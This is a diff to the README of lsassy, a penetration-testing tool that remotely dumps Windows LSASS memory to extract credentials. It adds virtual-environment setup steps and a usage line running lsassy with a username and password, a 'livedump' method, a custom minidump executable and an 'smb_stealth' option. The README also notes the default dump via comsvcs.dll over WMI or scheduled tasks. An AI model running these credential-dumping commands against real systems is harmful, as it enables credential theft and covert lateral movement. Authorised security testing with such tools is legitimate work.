@@ -39,6 +39,8 @@ python3 -m pip install lsassy
 ### From source for development
 
 ```
+python3 -m venv venv
+source venv/bin/activate
 python3 setup.py install
 ```
 
@@ -49,6 +51,7 @@ python3 setup.py install
 ```bash
 lsassy [-d domain] -u pixis -p P4ssw0rd targets
 lsassy [-d domain] -u pixis -H [LM:]NT targets
+lsassy [-d domain] -u croumi -p P4ssw0rd -m livedump -O live_dumper_path='/path/to/create_minidump.exe' -e smb_stealth targets
 ```
 
 By default, lsassy will try to dump lsass remotely using `comsvcs.dll` method, either via WMI or via a remote scheduled task.
